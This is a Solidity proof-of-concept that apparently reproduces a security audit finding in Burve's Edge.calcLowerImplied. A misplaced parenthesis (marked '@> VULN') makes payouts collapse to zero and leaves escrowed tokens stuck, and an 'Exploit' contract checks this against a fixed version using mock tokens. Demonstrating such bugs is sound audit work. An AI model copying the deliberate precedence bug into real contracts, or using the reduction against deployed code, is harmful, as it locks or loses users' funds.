// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Burve Edge.calcLowerImplied (Pashov, 55208).
   Cheatcode-free reduction. `(x << (128 / y)) << 64` shifts by 128/y.
   The intended ratio is `((x << 128) / y) << 64`. Below the range the
   quoted payout collapses and the escrow stays in the edge. */

contract Asset {
    string public name = "Settlement";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Edge {
    Asset public token;
    bool public immutable fixedMath;
    uint256 public lastPaid;

    constructor(Asset t, bool fix) {
        token = t;
        fixedMath = fix;
    }

    function calcLowerImplied(uint256 x, uint256 y) public view returns (uint256 xyX192) {
        if (fixedMath) {
            return ((x << 128) / y) << 64;
        }
        // @> VULN: parentheses shift x by (128 / y) instead of (x << 128) / y
        xyX192 = (x << (128 / y)) << 64;
    }

    function payQuote(uint256 x, uint256 y) external returns (uint256 paid) {
        uint256 xyX192 = calcLowerImplied(x, y);
        uint256 units = xyX192 >> 192;
        paid = units * 1 ether;
        lastPaid = paid;
        if (paid != 0) {
            token.transfer(msg.sender, paid);
        }
    }
}

contract Reserve {
    Asset public token;

    constructor(Asset t) {
        token = t;
    }

    function escrow(address to, uint256 amount) external {
        token.transfer(to, amount);
    }
}

contract Exploit {
    uint256 public constant X = 1000;
    uint256 public constant Y = 200;
    uint256 public constant BUDGET = 5 ether;

    Asset public token;
    Edge public edge;
    Edge public fixedEdge;
    Reserve public reserve;
    uint256 public buggyPaid;
    uint256 public fairPaid;
    uint256 public stuck;

    constructor() {
        token = new Asset();
        edge = new Edge(token, false);
        fixedEdge = new Edge(token, true);
        reserve = new Reserve(token);
        token.mint(address(reserve), BUDGET * 2);
    }

    function run() external {
        reserve.escrow(address(edge), BUDGET);
        buggyPaid = edge.payQuote(X, Y);
        stuck = token.balanceOf(address(edge));
        require(buggyPaid == 0, "buggy payout");
        require(stuck == BUDGET, "escrow stuck");
        reserve.escrow(address(fixedEdge), BUDGET);
        fairPaid = fixedEdge.payQuote(X, Y);
        require(fairPaid == BUDGET, "fair payout");
        require(token.balanceOf(address(fixedEdge)) == 0, "fixed empty");
        require(token.balanceOf(address(this)) == BUDGET, "lp received fair");
        require(stuck - buggyPaid == BUDGET, "shortfall");
    }
}
